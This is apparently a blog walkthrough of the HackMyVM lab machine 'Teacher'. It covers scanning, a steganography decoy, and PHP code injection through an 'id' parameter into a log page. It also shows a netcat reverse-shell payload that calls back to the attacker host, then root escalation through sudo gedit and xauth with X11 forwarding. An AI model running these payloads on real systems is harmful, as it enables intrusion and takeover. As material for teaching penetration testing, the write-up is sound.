---
layout: post
title: "HackMyVM - Teacher"
date: 2022-09-17 15:47:00 +0100
categories: hmv
tag: ["LogPoison", "PortForward", "RCE"]
---

Creator: [WWFYMN](https://hackmyvm.eu/profile/?user=WWFYMN)
Level: Easy
Release Date: 2022-09-07

## Scan

```bash
$ nmap -sC -sV -oA scan/Teacher -p- 192.168.1.14
Starting Nmap 7.93 ( https://nmap.org ) at 2022-09-17 01:21 WET
Nmap scan report for 192.168.1.14
Host is up (0.00031s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 1e2169d357da3a040b6ff450fb971310 (RSA)
|   256 36ee7f571da5b5ce1f41bab043322eff (ECDSA)
|_  256 f2bd80dde5050249c33b9f8329cb5496 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.54 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.87 seconds
```

## Enumeration

```
$ gobuster dir -e -w /usr/share/wordlists/dirb/big.txt -x php,txt,html,jpg -t 40 -u http://192.168.1.14
```

```bash
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.14
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,txt,html,jpg
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2022/09/17 01:24:32 Starting gobuster in directory enumeration mode
===============================================================
http://192.168.1.14/.htaccess            (Status: 403) [Size: 277]
http://192.168.1.14/.htaccess.php        (Status: 403) [Size: 277]
http://192.168.1.14/.htaccess.txt        (Status: 403) [Size: 277]
http://192.168.1.14/.htaccess.html       (Status: 403) [Size: 277]
http://192.168.1.14/.htaccess.jpg        (Status: 403) [Size: 277]
http://192.168.1.14/.htpasswd.txt        (Status: 403) [Size: 277]
http://192.168.1.14/.htpasswd.html       (Status: 403) [Size: 277]
http://192.168.1.14/.htpasswd.jpg        (Status: 403) [Size: 277]
http://192.168.1.14/.htpasswd.php        (Status: 403) [Size: 277]
http://192.168.1.14/.htpasswd            (Status: 403) [Size: 277]
http://192.168.1.14/access.php           (Status: 200) [Size: 12]
http://192.168.1.14/index.html           (Status: 200) [Size: 315]
http://192.168.1.14/log.php              (Status: 200) [Size: 27]
http://192.168.1.14/manual               (Status: 301) [Size: 313] [--> http://192.168.1.14/manual/]
http://192.168.1.14/rabbit.jpg           (Status: 200) [Size: 130469]
http://192.168.1.14/server-status        (Status: 403) [Size: 277]
Progress: 101497 / 102350 (99.17%)
===============================================================
2022/09/17 01:24:53 Finished
===============================================================
```

## Steganography

<img src="https://drive.google.com/uc?id=1qzaOlWD8v_b63G3T5I669r-QGmEtK38Q"/>

```bash
$ wget http://192.168.1.14/rabbit.jpg                                                                
--2022-09-17 01:25:33--  http://192.168.1.14/rabbit.jpg
Connecting to 192.168.1.14:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 130469 (127K) [image/jpeg]
Saving to: ‘rabbit.jpg’

rabbit.jpg                                100%[===================================================================================>] 127.41K  --.-KB/s    in 0.002s  

2022-09-17 01:25:33 (55.6 MB/s) - ‘rabbit.jpg’ saved [130469/130469]

$ stegseek rabbit.jpg    
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "rabbithole"       
[i] Original filename: "secret.txt".
[i] Extracting to "rabbit.jpg.out".

$ cat rabbit.jpg.out 
RabbitHole lol
```

## Enumeration access.php

```bash
$ curl "http://192.168.1.14/access.php"                                                          
<img src=''> 
```

```
$ sudo ffuf -w /usr/share/seclists/Discovery/Web-Content/url-params_from-top-55-most-popular-apps.txt -u http://192.168.1.14/access.php?FUZZ=FUZZ -t 200 -fs 12
```

```bash
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.1.14/access.php?FUZZ=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/url-params_from-top-55-most-popular-apps.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 12
________________________________________________

id                      [Status: 200, Size: 14, Words: 2, Lines: 1, Duration: 8300ms]
:: Progress: [211/211] :: Job [1/1] :: 31 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```

### RCE

```
$ curl "http://192.168.1.14/access.php?id=%3C?php%20echo%20exec(%27id%27);%20?%3E"
<img src='<?php echo exec('id'); ?>'>                                                                                                                                                                      
```

* Log Poisoning

```
$ curl http://192.168.1.14/log.php                                                
your logs:

uid=33(www-data) gid=33(www-data) groups=33(www-data)uid=33(www-data) gid=33(www-data) groups=33(www-data)    
```

* Listing Files

```
$ curl "http://192.168.1.14/access.php?id=%3C?php%20echo%20shell_exec(%27ls%20-l%27);%20?%3E"
<img src='<?php echo shell_exec('ls -l'); ?>'>                                                                                                                                                                      

$ curl http://192.168.1.14/log.php                                                           
your logs:

uid=33(www-data) gid=33(www-data) groups=33(www-data)uid=33(www-data) gid=33(www-data) groups=33(www-data)
-rw-r--r-- 1 root      root          191 Aug 25  2022 access.php
-rw-r--r-- 1 root      root           48 Aug 26  2022 clearlogs.php
-rw-r--r-- 1 mrteacher mrteacher 5301604 Aug 25  2022 e14e1598b4271d8449e7fcda302b7975.pdf
-rw-r--r-- 1 root      root          315 Aug 26  2022 index.html
-rwxrwxrwx 1 root      root          125 Mar 22 19:30 log.php
-rw-r--r-- 1 root      root       130469 Aug 26  2022 rabbit.jpg
```

### Reverse Shell

```url
http://192.168.1.14/access.php?id=%3C?php%20echo%20exec(%27nc%20-e%20/bin/bash%20192.168.1.6%204444%27);%20?%3E
```

```bash
$ curl http://192.168.1.14/log.php  
```

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.14] 37216
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## SSH (mrteacher)

<img src="https://drive.google.com/uc?id=1lYDBwW7O-JC036W0G-f4f_Hwg1ATxcXi"/>

```
$ ssh mrteacher@192.168.1.14
Linux Teacher 5.10.0-17-amd64 #1 SMP Debian 5.10.136-1 (2022-08-13) x86_64
Last login: Mon Sep  5 17:55:42 2022 from 192.168.1.23
mrteacher@Teacher:~$ 
```

```
mrteacher@Teacher:~$ sudo -l
Matching Defaults entries for mrteacher on Teacher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mrteacher may run the following commands on Teacher:
    (ALL : ALL) NOPASSWD: /bin/gedit, /bin/xauth
mrteacher@Teacher:~$ 
```

## Root (X11 Forwarding) - [xauth](https://www.thegeekdiary.com/how-to-set-x11-forwarding-export-remote-display-for-users-who-switch-accounts-using-sudo/)

* SSH Config

```
mrteacher@Teacher:~$ grep -i forward /etc/ssh/sshd_config
#AllowAgentForwarding yes
#AllowTcpForwarding yes
X11Forwarding yes
#       X11Forwarding no
#       AllowTcpForwarding no
mrteacher@Teacher:~$
```

### SSH + X11 Forward

```
$ ssh -X mrteacher@192.168.1.14
Linux Teacher 5.10.0-17-amd64 #1 SMP Debian 5.10.136-1 (2022-08-13) x86_64
Last login: Wed Sep 17 19:53:14 2022 from 192.168.1.6
mrteacher@Teacher:~$ 
```

<img src="https://drive.google.com/uc?id=15L7vkqOjcFiZewMAU4SwV6EGHnfB2Yr3"/>

### Magic Cookie #xauth

```
mrteacher@Teacher:~$ echo xauth add $(xauth list ${DISPLAY#localhost})
xauth add Teacher/unix:10 MIT-MAGIC-COOKIE-1 081d382272b4dace081411dcce79cffc

mrteacher@Teacher:~$ sudo xauth add Teacher/unix:10 MIT-MAGIC-COOKIE-1 081d382272b4dace081411dcce79cffc

mrteacher@Teacher:~$ sudo xauth list
Teacher/unix:10  MIT-MAGIC-COOKIE-1  081d382272b4dace081411dcce79cffc

mrteacher@Teacher:~$ sudo /bin/gedit
```

<img src="https://drive.google.com/uc?id=18sekpqmyEWgOYC0ILcIMJdiHsXdevl--"/>
